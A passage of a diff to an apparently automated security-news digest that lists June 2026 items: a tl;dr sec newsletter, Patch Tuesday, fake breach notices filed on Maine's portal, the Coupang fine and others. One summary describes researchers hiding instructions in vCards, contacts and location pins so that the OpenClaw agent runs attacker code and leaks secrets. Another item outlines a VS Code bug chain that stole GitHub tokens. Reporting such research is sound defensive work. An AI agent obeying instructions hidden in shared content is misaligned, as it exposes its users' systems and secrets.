like with many things, annoyingly wrote a better version of what I would write in his post on joining Wiz . Similarly, I hope to “ work for the security industry, at OpenAI. ” I shared a LinkedIn post with a bit more details, feel free to say hi or share thoughts there 👋 P.S. tl;dr sec will continue, don’t worry. Also, I will continue to include high quality content from Anthropic, that is also unchanged. More on that below. Sponsor 📣 State of SDLC Report 2026 The 2026 SDLC Security Report analyzed real-world development environments, codebases, and SDLC infrastructure to understand how risk is evolving and how software is built and shipped. The TL;DR: Risk isn’t primarily driven by rare vulnerabilities. It scales through reuse, permissions, and automation across the SDLC. The report explores: AI copilots and developer tooling risk Dependency concentration and supply chain exposure Secret leakage trends CI/CD and GitHub Actions attack paths Learn how SDLC risk is reshaping application security. 👉 Get the State of SDLC Report 👈 Hm interesting, neat to see the SDLC is evolving and how it’s affecting AppSec 🤔 I like the stats and figures. AppSec 1-Click GitHub Token Stealing via a VSCode Bug Ammar Askar describes a bug in which clicking a github.dev link could steal a GitHub token with read/write access to all your private repos, by chaining a Jupyter notebook payload that exploits VS Code webview's did-keydown event forwarding to install a malicious extension. Neat write-up! How We Cut Semgrep’s Taint Analysis Time by 75% Semgrep's Austin Theriault walks through how the taint analysis engine was redesigned to run once instead of twice, cutting scan times by up to 75%. Taint analysis is used for vulnerabilities like SQL injection by tracking user input as it flows through code from sources to sinks, with pr
-```
-
-#### Corroborating sources (1)
-
-- **tl;dr sec** (practitioner_analysis)
-  - Title: [tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security
-  - Published: 2026-06-11T14:30:00+00:00
-  - Link: https://tldrsec.com/p/tldr-sec-332
-  - Summary: Why I joined OpenAI to lead Cyber efforts, playlist of the latest cloud security talks, AWS' supply chain best practices
 
 ### Cluster 56111b9aeb — score 10
 
@@ -2590,47 +2562,6 @@ Microsoft Patch Tuesday for June 2026 — Snort rules and prominent vulnerabilit
   - Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-june-2026-snort-rules-and-prominent-vulnerabilities/
   - Summary: Microsoft Patch Tuesday details for June 2026.
 
-### Cluster 7c6c399f7e — score 10
-
-- Title: Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage
-- Source: Recorded Future (threat_research_primary)
-- Published: 2026-06-05T00:00:00+00:00
-- Link: https://www.recordedfuture.com/blog/recorded-future-holistic-sourcing-wins
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, supply_chain
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, apt_espionage
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Recorded Future’s Intelligence Graph® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.
-```
-
-#### Full body
-
-```
-Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage Threats don't operate in silos, and neither should your intelligence. This post, the first in a three-part series, breaks down why comprehensive sourcing is the foundation of effective threat intelligence -- and how Recorded Future's Intelligence Graph® monitors over one million sources across technical, criminal, collective, and open-source domains to surface what narrow or siloed solutions miss. From nation-state TTPs to criminal infrastructure to credential leaks, complete coverage is what separates awareness from action. Part 1 of 3: Built Different — How Recorded Future's Unique Sourcing Enables Comprehensive Intelligence Threats don't manifest from a single place or operate in silos. Your intelligence shouldn’t, either. When you’re evaluating threat intelligence providers, visibility at speed matters most. Many providers focus exclusively on narrow collection areas, like dark web activity or malware. Others are rich with data on incidents that have already taken place rather than the early signals of threat infrastructure that enable preventative action. They've built deep expertise in a narrow lane—dark web collection, malware analysis, vulnerability feeds—and they're good at it. But specialization has limitations in reducing risk. Attackers don't stay in their lane. They pivot across infrastructure, blend nation-state TTPs with criminal tooling, and exploit the seams between what your tools can see and what they can’t. The gaps in your intelligence coverage are exactly where they operate. At Recorded Future, we’ve built the industry’s most complete intelligence capability, collecting and analyzing data from over one million sources across technical, open, and underground environments. This breadth isn’t just about scale. It’s about seeing what others miss—and acting on it. The limits of partial visibility Many threats can only be revealed through patterns across massive datasets —patterns that simply don’t exist in smaller or siloed collections. Malicious infrastructure and threat signals are often only available from disparate sources, so you need a multi-faceted collection apparatus to detect campaigns early enough to stop them. Consider this: A security team believed they had full visibility into outbound traffic during an investigation. But Recorded Future’s Network Intelligence surfaced suspicious activity on a specific port. That signal led to deeper investigation—revealing additional command-and-control communication that had gone undetected due to incomplete logging. Without large-scale telemetry and correlation, part of the intrusion would have remained invisible. This is the difference between data and intelligence. How Recorded Future sources: four domains, one picture Threats don't originate from one place, and neither should your intelligence. Adversaries move across malware infrastructure, underground marketplaces, phishing campaigns, credential leaks, and vulnerability exploitation, often leaving little evidence behind at each step. Catching them requires complete coverage. That’s why Recorded Future integrates intelligence across four domains: Technical : Internet-scale telemetry, including malware analysis Criminal : Underground and ransomware sources Collective : Customer-contributed intelligence (Collective Insights®) Open-source (OSINT) : Malicious sites, code repositories, and social media This unified approach enables organizations to track threats across their full lifecycle—from reconnaissance to exploitation. Comprehensive intelligence — from awareness to action When you’re evaluating threat intelligence vendors, it’s important to look at the scale and quality of their sourcing. While many security solutions excel in specific areas, comprehensive threat intelligence requires looking from every vantage point. Some might offer endpoint detection and dark web monitoring, but have no visibility into supply chain attacks. O
-```
-
-#### Corroborating sources (1)
-
-- **Recorded Future** (threat_research_primary)
-  - Title: Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage
-  - Published: 2026-06-05T00:00:00+00:00
-  - Link: https://www.recordedfuture.com/blog/recorded-future-holistic-sourcing-wins
-  - Summary: Recorded Future’s Intelligence Graph® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.
-
 ### Cluster b60f65219b — score 10
 
 - Title: Patch Tuesday to Pentest Wednesday: How a Global Investment Firm Reduced Security Surprises
@@ -2671,45 +2602,6 @@ Patch Tuesday to Pentest Wednesday: How a Global Investment Firm Reduced Securit
   - Published: 2026-06-10T18:55:51+00:00
   - Link: https://horizon3.ai/intelligence/blogs/patch-tuesday-to-pentest-wednesday-reducing-security-surprises/
   - Summary: A global investment firm used NodeZero® to reduce attack-path impacts from 251 to 0, eliminate compromised credentials, and build a continuous security validation program across 18 locations.
-
-### Cluster 9195174ea0 — score 10
-
-- Title: How threat hunting evolves at scale
-- Source: Red Canary (detection_response_operations)
-- Published: 2026-06-11T13:09:00+00:00
-- Link: https://redcanary.com/blog/threat-detection/threat-hunting-scaled/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-We offer a practical roadmap for evolving informal, ad hoc threat hunting practices into a mature, scalable program
-```
-
-#### Full body
-
-```
-Skip Navigation Get a Demo
-```
-
-#### Corroborating sources (1)
-
-- **Red Canary** (detection_response_operations)
-  - Title: How threat hunting evolves at scale
-  - Published: 2026-06-11T13:09:00+00:00
-  - Link: https://redcanary.com/blog/threat-detection/threat-hunting-scaled/
-  - Summary: We offer a practical roadmap for evolving informal, ad hoc threat hunting practices into a mature, scalable program
 
 ### Cluster 1fb231b011 — score 10
 
@@ -2799,7 +2691,7 @@ Back to Blog Artificial Intelligence Rapid7 Gains Access To Anthropic’s Projec
 - Source: BleepingComputer (cyber_news_breach_reporting)
 - Published: 2026-06-11T22:44:58+00:00
 - Link: https://www.bleepingcomputer.com/news/security/maine-breach-portal-abused-to-publish-fake-data-breach-disclosures/
-- Fetch status: fetch_failed:ReadTimeout
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
@@ -2820,6 +2712,12 @@ Back to Blog Artificial Intelligence Rapid7 Gains Access To Anthropic’s Projec
 In an unusual misinformation campaign, fraudulent data breach disclosures were submitted to Maine's official breach portal and publicly posted before their legitimacy could be verified, prompting companies to deny the claims. [...]
 ```
 
+#### Full body
+
+```
+Maine breach portal abused to publish fake data breach disclosures By Bill Toulas June 11, 2026 06:44 PM 0 In an unusual misinformation campaign, fraudulent data breach disclosures were submitted to Maine’s official breach portal and publicly posted before their legitimacy could be verified, prompting companies to deny the claims. A notice allegedly filed by multiplayer social virtual reality platform VRChat is the most recent entry in the state Attorney General's breach disclosure database. However, a company representative told BleepingComputer that the breach notification is fake and has been filed using the name of a fictitious employee. VRChat is a multiplayer social virtual reality platform built on Unity and originally released for Windows and Oculus Rift in 2014, where users interact as customizable avatars in user-created virtual worlds. The fake VRChat data breach e ntry notes that personal data of more than 2.4 million users was exposed to hackers after they gained access to the company's cloud environment. Whoever submitted the false information made the effort to draft a notification letter for affected individuals, which claimed that the hacking incident occurred between May 10 and 12 and impacted the following types of data: VRChat username Email address associated with a VRChat account VRChat+ subscription status Login history, including device, hardware identifiers, and IP addresses Steam or Meta user ID linked to a VRChat account At a cursory look, the false letter appears legitimate, filled with details about unauthorized access, results of a forensic investigation, actions taken after detecting the hack, claims that steps have been taken to increase security, and what users should do to increase protection for their account. Charles Tupper, Head of Community at VRChat, told BleepingComputer that the data breach notification in the database of the Maine Office of the Attorney General is fraudulent: "VRChat did not submit this Notice of Data Incident, and the employee/email cited does not exist. We have no reason to believe that our data or systems have been compromised." Tupper added that the company is "in the process of contacting the Maine Attorney General's office to have this removed." Graham Gaylor, the CEO and co-founder of VRChat, also confirmed the statement BleepingComputer received from Tupper. The Maine Office of the Attorney General also responded to our request for comments and said that "the notice will be coming down" and that they were "not aware of another example of intentional misrepresentation of the notice filings." Earlier this week, the Maine Attorney General's Office listed another suspicious data breach notification allegedly from Discord, which claimed that 10 million people were impacted by a data breach. Maine's Attorney General Office confirmed to BleepingComputer that anyone can submit a breach notification form and have it added to the portal without verification. "We don’t have any independent knowledge of the breaches, the submitting entity fills out the information and it goes directly onto the site. We will review the one you’ve flagged, thank you," Maine Attorney General's Office told BleepingComputer when asked about the validity of the Discord data breach submission. Unlike most formal data breach notifications, the Discord entry did not include a notification letter from the company informing consumers about the breach, disclosing what happened and how those impacted can protect themselves. Apart from the company address, the Discord entry included vague and unreliable information, starting with the name of the person submitting the notice, a Gmail contact, and a placeholder phone number. Furthermore, the details about the breach occurring on July 9, 2024, and being discovered on August 8, 2025, along with an inconsistent consumer notification date of January 1st, 2000, are clear indications of a false submission. Although a data breach did impact Discord in 2025 , it
+```
+
 #### Corroborating sources (1)
 
 - **BleepingComputer** (cyber_news_breach_reporting)
@@ -2827,43 +2725,6 @@ In an unusual misinformation campaign, fraudulent data breach disclosures were s
   - Published: 2026-06-11T22:44:58+00:00
   - Link: https://www.bleepingcomputer.com/news/security/maine-breach-portal-abused-to-publish-fake-data-breach-disclosures/
   - Summary: In an unusual misinformation campaign, fraudulent data breach disclosures were submitted to Maine's official breach portal and publicly posted before their legitimacy could be verified, prompting companies to deny the claims. [...]
-
-### Cluster b6e1e5877f — score 10
-
-- Title: Coupang hit with record $409 million data breach fine in Korea
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-06-11T12:52:41+00:00
-- Link: https://www.bleepingcomputer.com/news/security/south-korea-hits-coupang-with-record-409-million-fine-over-data-breach/
-- Fetch status: fetch_failed:ReadTimeout
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach
-- affected_industries: retail_ecommerce
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: data_breach
-- affected_industries: retail_ecommerce
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-​​The Personal Information Protection Commission (PIPC), South Korea's data protection regulator, has fined e-commerce giant Coupang a record 624.6 billion won (roughly $409 million) following a massive data breach affecting more than 37 million customers [...]
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Coupang hit with record $409 million data breach fine in Korea
-  - Published: 2026-06-11T12:52:41+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/south-korea-hits-coupang-with-record-409-million-fine-over-data-breach/
-  - Summary: ​​The Personal Information Protection Commission (PIPC), South Korea's data protection regulator, has fined e-commerce giant Coupang a record 624.6 billion won (roughly $409 million) following a massive data breach affecting more than 37 million customers [...]
 
 ### Cluster b9fc8f1b1a — score 10
 
@@ -2909,6 +2770,51 @@ New Attacks Trick OpenClaw AI Agent Into Running Code and Leaking Secrets  Sw
   - Published: 2026-06-11T17:46:32+00:00
   - Link: https://thehackernews.com/2026/06/new-attacks-trick-openclaw-ai-agent.html
   - Summary: Two security teams have shown, in separate research published this week, that OpenClaw, the popular self-hosted AI agent, can be driven to run attacker-controlled code or hand over sensitive data through ordinary-looking inputs. Imperva buried instructions inside shared contacts, vCards, and location pins that the agent executed without the victim ever seeing them. Varonis built a test agent on
+
+### Cluster 7c21419055 — score 10
+
+- Title: [tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security
+- Source: tl;dr sec (practitioner_analysis)
+- Published: 2026-06-11T14:30:00+00:00
+- Link: https://tldrsec.com/p/tldr-sec-332
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: supply_chain
+- affected_industries: critical_infrastructure
+- affected_products: GitHub, OpenAI/ChatGPT
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Primary article taxonomy
+- threat_categories: supply_chain
+- affected_industries: critical_infrastructure
+- affected_products: GitHub, OpenAI/ChatGPT
+- content_type: news_report
+- confidence_tier: tier_3_analysis
+
+#### Summary
+
+```
+Why I joined OpenAI to lead Cyber efforts, playlist of the latest cloud security talks, AWS' supply chain best practices
+```
+
+#### Full body
+
+```
+0 tl;dr sec Posts [tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security [tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security Why I joined OpenAI to lead Cyber efforts, playlist of the latest cloud security talks, AWS' supply chain best practices Clint Gibler June 11, 2026 Hey there, I hope you’ve been doing well! 🤔 New Job, Who Dis? TL;DR : I’ve joined OpenAI to lead their Cyber efforts. I’m joined by Mike Aiello , an awesome security executive and human. Mike was previously CTO at Secureworks, led product for Google Cloud Security from 0 → $B’s in revenue, and CISO at Goldman Sachs. I was going to write a post describing all the details about joining, my thought process, etc. but it turns out there’s a lot to do at OpenAI and I’ve gotten very busy 😅 The post is started but not finished, will share when I can. So here’s the short version. Why I was very happy at Semgrep and wasn’t looking for new opportunities, but when an OpenAI recruiter reached out, it seemed like a once in a lifetime company and opportunity that I couldn’t pass by. During the interview process, when I spoke with my potential colleagues, I was impressed by how they were incredibly smart and kind, and genuinely, earnestly, cared about making a positive impact on the world. Several people, without me bringing it up, expressed to me that as models get better, they feel a moral responsibility to do what they can to secure the world’s software. And now from the inside, I can see that the sentiment was genuine, and not a facade (you always wonder as an outsider). OpenAI has easily already spent millions securing open source and critical infrastructure that they haven’t yet claimed PR cred for doing. I’ve long talked about the power of secure by design and eliminating vulnerability classes . Being at OpenAI makes that feel tractable in a way it never has before. I’m optimistic we, the security community, can meaningfully raise the world’s security bar over the next few years. Seriously. Lastly, how I think about the decision is also well expressed by my friend Rami McCarthy , who, like with many things, annoyingly wrote a better version of what I would write in his post on joining Wiz . Similarly, I hope to “ work for the security industry, at OpenAI. ” I shared a LinkedIn post with a bit more details, feel free to say hi or share thoughts there 👋 P.S. tl;dr sec will continue, don’t worry. Also, I will continue to include high quality content from Anthropic, that is also unchanged. More on that below. Sponsor 📣 State of SDLC Report 2026 The 2026 SDLC Security Report analyzed real-world development environments, codebases, and SDLC infrastructure to understand how risk is evolving and how software is built and shipped. The TL;DR: Risk isn’t primarily driven by rare vulnerabilities. It scales through reuse, permissions, and automation across the SDLC. The report explores: AI copilots and developer tooling risk Dependency concentration and supply chain exposure Secret leakage trends CI/CD and GitHub Actions attack paths Learn how SDLC risk is reshaping application security. 👉 Get the State of SDLC Report 👈 Hm interesting, neat to see the SDLC is evolving and how it’s affecting AppSec 🤔 I like the stats and figures. AppSec 1-Click GitHub Token Stealing via a VSCode Bug Ammar Askar describes a bug in which clicking a github.dev link could steal a GitHub token with read/write access to all your private repos, by chaining a Jupyter notebook payload that exploits VS Code webview's did-keydown event forwarding to install a malicious extension. Neat write-up! How We Cut Semgrep’s Taint Analysis Time by 75% Semgrep's Austin Theriault walks through how the taint analysis engine was redesigned to run once instead of twice, cutting scan times by up to 75%. Taint analysis is used for vulnerabilities like SQL injection by tracking user input as it flows through code from sources to sinks, with pr
+```
+
+#### Corroborating sources (1)
+
+- **tl;dr sec** (practitioner_analysis)
+  - Title: [tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security
+  - Published: 2026-06-11T14:30:00+00:00
+  - Link: https://tldrsec.com/p/tldr-sec-332
+  - Summary: Why I joined OpenAI to lead Cyber efforts, playlist of the latest cloud security talks, AWS' supply chain best practices
 
 ### Cluster 839d8b3f2e — score 10
 
@@ -2986,50 +2892,44 @@ Microsoft today released patches for 204 vulnerabilities. 38 of these vulnerabil
   - Link: https://isc.sans.edu/diary/rss/33064
   - Summary: Microsoft today released patches for 204 vulnerabilities. 38 of these vulnerabilities are considered critical, and three have been disclosed before today. Six of the vulnerabilities affect Microsoft cloud solutions and do not require any user action. In addition, Microsoft incorporated 360 different vulnerabilities affecting Chromium into its Edge browser.
 
-### Cluster 4537ab9a34 — score 9
+### Cluster 9195174ea0 — score 9
 
-- Title: Hardening Intune: The Implementation Guide
-- Source: TrustedSec (detection_response_operations)
-- Published: 2026-06-11T04:00:00+00:00
-- Link: https://trustedsec.com/blog/hardening-intune-the-implementation-guide
+- Title: How threat hunting evolves at scale
+- Source: Red Canary (detection_response_operations)
+- Published: 2026-06-11T13:09:00+00:00
+- Link: https://redcanary.com/blog/threat-detection/threat-hunting-scaled/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: phishing_social_eng, zero_day
-- affected_industries: government
-- urgency_signals: zero_day
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- threat_categories: phishing_social_eng, zero_day
-- affected_industries: government
-- urgency_signals: zero_day
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-<p>Part 2: Step-by-Step Configuration for Every ControlThis is Part 2 of a two-part series on Intune security hardening. Part 1 covers the attacks we have seen against this types of platforms, why platform administration…</p>
+We offer a practical roadmap for evolving informal, ad hoc threat hunting practices into a mature, scalable program
 ```
 
 #### Full body
 
 ```
-Blog Hardening Intune: The Implementation Guide June 11, 2026 Hardening Intune: The Implementation Guide Written by Carlos Perez Incident Response Mobile Security Assessment Table of contents Prerequisites: Microsoft Graph PowerShell Phase 1: Immediate Actions Phase 2: Short-Term Hardening Phase 3: Medium-Term Hardening Phase 4: Detection Appendix: Running the Full Audit Implementation Checklist Closing Thought Part 2: Step-by-Step Configuration for Every Control This is Part 2 of a two-part series on Intune security hardening. Part 1 covers the attacks we have seen against this types of platforms, why platform administration roles are Tier 0 assets, and the controls you need. This post walks you through how to implement each one. In Part 1 , I made the case that these attacks are not an Intune vulnerability, it is a access governance failure. In most incident the attacker compromises an Intune administrator account, created a new Global Admin, and used the platform's built-in remote wipe capability to factory reset devices in the most destructive cases. No malware, no zero-day, just a legitimate management feature executed from a compromised privileged account. I laid out 11 controls and a prioritized quick-win list. This post is the implementation guide. For each control, I will walk through the configuration path, decision points, and a validation test so you can confirm it is working. I am organizing these in the order I would implement them during a hardening engagement, not the order they appeared in Part 1. Implementation Sequence The order matters. Some controls are prerequisites for others, and some produce immediate risk reduction with minimal operational disruption. Here is how I sequence these in engagements: Phase 1: Immediate (Day 1, no dependencies) 1. Audit and remove standing Global Admin and Intune Administrator role assignments 2. Enable PIM on Intune-related roles 3. Enable Multi-Admin Approval for destructive actions 4. Review Graph API app registrations Phase 2: Short-term (Week 1-2, requires planning) 5. Enforce phishing-resistant MFA via Conditional Access authentication strength 6. Configure RBAC custom roles and scope tags 7. Lock down Intune portal access with Conditional Access Phase 3: Medium-term (Week 2-4, requires testing) 8. Deploy Privileged Access Workstations and configure redundancy 9. Enforce script signing and lock down Win32 app deployment 10. Harden device enrollment restrictions Phase 4: Detection (can run in parallel) 11. Deploy Sentinel analytics rule and configure telemetry pipeline Prerequisites: Microsoft Graph PowerShell Throughout this guide, I provide PowerShell commands alongside the portal navigation steps. Some of these are faster and more thorough than clicking through the GUI, especially for auditing and enumeration. You will need the Microsoft Graph PowerShell SDK installed. I have packaged all of the PowerShell in this post as a module of advanced functions: Invoke-IntuneSecurityAudit.ps1 . Download the module, dot-source it, and every function is available with full Get-Help documentation and -Verbose output. # Install the Graph PowerShell SDK (if not already installed) Install-Module Microsoft.Graph -Scope CurrentUser # Dot-source the audit module . .\Invoke-IntuneSecurityAudit.ps1 # Connect with read-only scopes for the audit Connect-IntuneSecurityAudit -Verbose # If you need write scopes later for configuration changes Connect-IntuneSecurityAudit -IncludeWriteScopes -Verbose Every function uses [CmdletBinding()] and Write-Verbose so you can control output verbosity. Use -Verbose to see progress and detail, or omit it for clean pipeline output suitable for Export-Csv or further processing. You will be prompted for permissions when connecting: Figure 1 - Permission Request Phase 1: Immediate Actions 1. Audit and Remove Standing Privileged Access Why this is first: Every other control assumes you know who has privileged access today. You cannot enable PIM on roles that
+Skip Navigation Get a Demo
 ```
 
 #### Corroborating sources (1)
 
-- **TrustedSec** (detection_response_operations)
-  - Title: Hardening Intune: The Implementation Guide
-  - Published: 2026-06-11T04:00:00+00:00
-  - Link: https://trustedsec.com/blog/hardening-intune-the-implementation-guide
-  - Summary: <p>Part 2: Step-by-Step Configuration for Every ControlThis is Part 2 of a two-part series on Intune security hardening. Part 1 covers the attacks we have seen against this types of platforms, why platform administration…</p>
+- **Red Canary** (detection_response_operations)
+  - Title: How threat hunting evolves at scale
+  - Published: 2026-06-11T13:09:00+00:00
+  - Link: https://redcanary.com/blog/threat-detection/threat-hunting-scaled/
+  - Summary: We offer a practical roadmap for evolving informal, ad hoc threat hunting practices into a mature, scalable program
 
 ### Cluster 98432c6203 — score 9
 
@@ -3071,45 +2971,6 @@ Table of contents Key takeaways What Are OSS Incident Response Tools What Capabi
   - Published: 2026-06-11T18:11:44+00:00
   - Link: https://orca.security/resources/blog/open-source-incident-response-tools/
   - Summary: Key takeaways Open source incident response tools are freely licensed programs you can run on-premises or in cloud accounts to detect intrusions, collect forensic artifacts, manage cases, and coordinate responders. They span digital forensics, live response, security information workflows, centralized logging, and fleet querying. Teams pair them with runbooks and vulnerability management discipline so findings […]
-
-### Cluster 51fbb1ffa2 — score 9
-
-- Title: What Is Containerization? Security and Best Practices
-- Source: Orca Security Research (cloud_identity_infrastructure)
-- Published: 2026-06-11T13:40:40+00:00
-- Link: https://orca.security/resources/blog/containerization-security/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Modern applications depend on containers for speed, portability, and scalability. Development teams use containerization to package software consistently across laptops, CI/CD pipelines, Kubernetes clusters, and cloud environments. That flexibility comes with tradeoffs. Containers share a host operating system kernel, which creates a different security model than traditional virtual machines. Risks can emerge from vulnerable images, […]
-```
-
-#### Full body
-
-```
-Table of contents Key takeaways What Is Containerization? Containerization vs. Virtual Machines (VMs) The Components of a Containerized Environment Hardware Host Operating System Container Engine Containerized Applications How Containerization Works Benefits of Containerization Practical Applications of Containerization Deploying Microservices-Based Applications Migrating Legacy Applications to Modern Infrastructure Running Applications Across Hybrid or Multi-Cloud Environments Enabling Consistent Environments for CI/CD Pipelines Supporting Edge Computing and IoT Workloads Popular Containerization Technologies Docker LXC (Linux Containers) Windows Server Containers Kubernetes Containerization Security: Risks and Strategies Common Container Security Risks Container Security Best Practices Securing Containerized Applications at Scale Frequently Asked Questions About Containerization Modern applications depend on containers for speed, portability, and scalability. Development teams use containerization to package software consistently across laptops, CI/CD pipelines, Kubernetes clusters, and cloud environments. That flexibility comes with tradeoffs. Containers share a host operating system kernel, which creates a different security model than traditional virtual machines. Risks can emerge from vulnerable images, exposed secrets, weak access controls, misconfigured orchestration platforms, and insecure runtime settings. Understanding how containerization works is essential for building secure cloud-native applications. This guide explains the fundamentals of containerization, compares containers with virtual machines, examines the technologies behind modern container platforms, and outlines the security controls organizations should implement to reduce risk at scale. Key takeaways Containerization packages an application with its dependencies into an image that runs on a shared host kernel through a container engine. Containers prioritize speed and density over the hardware-isolation model of virtual machines; security controls must match that architecture. A typical production stack spans images, registries, orchestration, and host configuration; weak points appear at each layer. Hardening should reference NIST SP 800-190 and CIS container benchmarks rather than informal checklists. Containerization packages applications with dependencies into portable images that run on a shared host kernel through a container engine. Unlike virtual machines, containers do not ship a full guest OS per workload. Security depends on image provenance, registry controls, orchestrator RBAC, and host hardening. Practitioners map defenses to NIST SP 800-190 and CIS container benchmarks. What Is Containerization? Containerization is a cloud and datacenter workload pattern that encapsulates software and its dependencies in a container image. The image is an immutable artifact storage. At runtime, the engine creates a writable layer. It starts processes inside namespaces and cgroups on Linux. It applies Linux capabilities and seccomp profiles when configured. The Open Container Initiative publishes image and runtime specifications. Engines such as containerd and CRI-O interoperate under Kubernetes. The model matters for security because policy is expressed as code: Dockerfile instructions, admission controllers, and pod security contexts. When those artifacts drift, scanners and auditors surface concrete deltas instead of subjective opinions. Teams that operationalize container security treat those artifacts as part of the attack surface, not as boilerplate. Containerization vs. Virtual Machines (VMs) Containers and virtual machines solve different problems. A VM includes a full guest operating system on virtual hardware provided by a hypervisor. A container shares the host kernel and isolates processes with OS primitives. NIST SP 800-190 Figure 1 illustrates the additional isolation boundary VMs provide versus containers. Dimension Containers Virtual mac
-```
-
-#### Corroborating sources (1)
-
-- **Orca Security Research** (cloud_identity_infrastructure)
-  - Title: What Is Containerization? Security and Best Practices
-  - Published: 2026-06-11T13:40:40+00:00
-  - Link: https://orca.security/resources/blog/containerization-security/
-  - Summary: Modern applications depend on containers for speed, portability, and scalability. Development teams use containerization to package software consistently across laptops, CI/CD pipelines, Kubernetes clusters, and cloud environments. That flexibility comes with tradeoffs. Containers share a host operating system kernel, which creates a different security model than traditional virtual machines. Risks can emerge from vulnerable images, […]
 
 ### Cluster 1425223a12 — score 9
 
@@ -3195,26 +3056,73 @@ Crime The $100 Million Crypto “Looksmaxxing” Boom: How Chinese Cartel Suppli
   - Link: https://www.chainalysis.com/blog/law-enforcement-dismantles-audia6-laundering-network-june-2026/
   - Summary: Summary An international coalition of law enforcement agencies, including the U.S. DOJ, Secret Service, Europol, CBZC, and others, dismantled “AudiA6,”… The post Global Law Enforcement Dismantles ‘AudiA6’ Crypto Laundering Network Linked to Ransomware Gangs appeared first on Chainalysis .
 
-### Cluster 52dabc044f — score 9
+### Cluster b6e1e5877f — score 9
 
-- Title: Nottingham University data breach affects over 450,000 students
+- Title: Coupang hit with record $409 million data breach fine in Korea
 - Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-06-11T07:27:53+00:00
-- Link: https://www.bleepingcomputer.com/news/security/nottingham-university-data-breach-affects-over-450-000-students/
-- Fetch status: fetch_failed:ReadTimeout
+- Published: 2026-06-11T12:52:41+00:00
+- Link: https://www.bleepingcomputer.com/news/security/south-korea-hits-coupang-with-record-409-million-fine-over-data-breach/
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
 - threat_categories: data_breach
-- affected_industries: education
+- affected_industries: critical_infrastructure, education, retail_ecommerce, telecommunications
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
 - threat_categories: data_breach
-- affected_industries: education
+- affected_industries: critical_infrastructure, telecommunications, education, retail_ecommerce
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+​​The Personal Information Protection Commission (PIPC), South Korea's data protection regulator, has fined e-commerce giant Coupang a record 624.6 billion won (roughly $409 million) following a massive data breach affecting more than 37 million customers [...]
+```
+
+#### Full body
+
+```
+Coupang hit with record $409 million data breach fine in Korea By Sergiu Gatlan June 11, 2026 08:52 AM 0 ​​The Personal Information Protection Commission (PIPC), South Korea's data protection regulator, has fined e-commerce giant Coupang a record 624.6 billion won (roughly $409 million) following a massive data breach affecting more than 37 million customers. Subsidiary Coupang Fulfillment Service was also fined 248 million won for unlawfully collecting, using, and handling customers' personal and sensitive data. The investigators also found that the personal information of approximately 37.55 million people was leaked due to inadequate security practices, including failures in authentication key management and access controls. PIPC also cited violations of data destruction and leak-notification requirements, interference with the independence of Coupang's data protection officer, and obstruction of the investigation. "Personal information of approximately 37.55 million people leaked due to insufficient basic safety management system, including negligence in authentication signature key management and access control," the PIPC said . "Regarding Coupang's violation of safety measure obligations and collection of personal information without legal basis, a fine of 624.681 billion won and a fine of 16.8 million won were imposed, as well as corrective orders, announcements, and publication orders." Coupang is an American online retail company that operates in the South Korean market, employs 95,000 people, and has reported annual revenue exceeding $30 billion. The company announced plans in late December to pay 1.685 trillion won (approximately $1.17 billion) and to start distributing single-use purchase vouchers totaling 50,000 won (about $34) per customer in January 2026 to compensate over 33 million affected customers. This breach, one of the worst in South Korea's history, occurred in late June but was discovered only in mid-November, 